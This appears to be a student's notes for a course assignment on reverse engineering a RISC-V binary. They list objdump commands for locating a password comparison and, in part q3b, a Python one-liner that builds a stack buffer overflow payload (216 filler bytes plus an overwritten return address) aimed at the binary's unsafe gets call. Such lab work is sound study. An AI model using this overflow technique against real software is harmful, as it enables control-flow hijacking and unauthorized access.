[![Review Assignment Due Date](https://classroom.github.com/assets/deadline-readme-button-22041afd0340ce965d47ae6ef1cefeee28c7c493a6346c4f15d667ab976d596c.svg)](https://classroom.github.com/a/d5nOy1eX)

# q3 a
riscv64-unknown-linux-gnu-objdump -s target_malinigoyal07 | grep "passed"

riscv64-unknown-linux-gnu-objdump -d target_malinigoyal07 | grep "<strcmp>"

riscv64-unknown-linux-gnu-objdump -d target_malinigoyal07 | grep -A 5 -B 10 "1064c:" > output.txt 
  


riscv64-unknown-linux-gnu-objdump -s --start-address=0x83f80 --stop-address=0x83f88 target_malinigoyal07

riscv64-unknown-linux-gnu-objdump -s --start-address=0x5e091 --stop-address=0x5e0b0 target_malinigoyal07

grep bDY+


# q3 b

riscv64-unknown-linux-gnu-objdump -d target_malinigoyal07 > output.txt

riscv64-unknown-linux-gnu-objdump -d target_malinigoyal07 | grep -E "gets|scanf"

looked for 104.. bcs :The instruction at 104d8 is calling _IO_gets -> buffer


riscv64-unknown-linux-gnu-objdump -s --start-address=0x52cb0 --stop-address=0x52cc2 target_malinigoyal07 // didn work

in above stack length of 208, so input a string of length greater than that- 216 + return address set to pass instruction

python3 -c 'import sys; sys.stdout.buffer.write(b"A"*216 + b"\xe8\x04\x01\x00\x00\x00\x00\x00")' > payload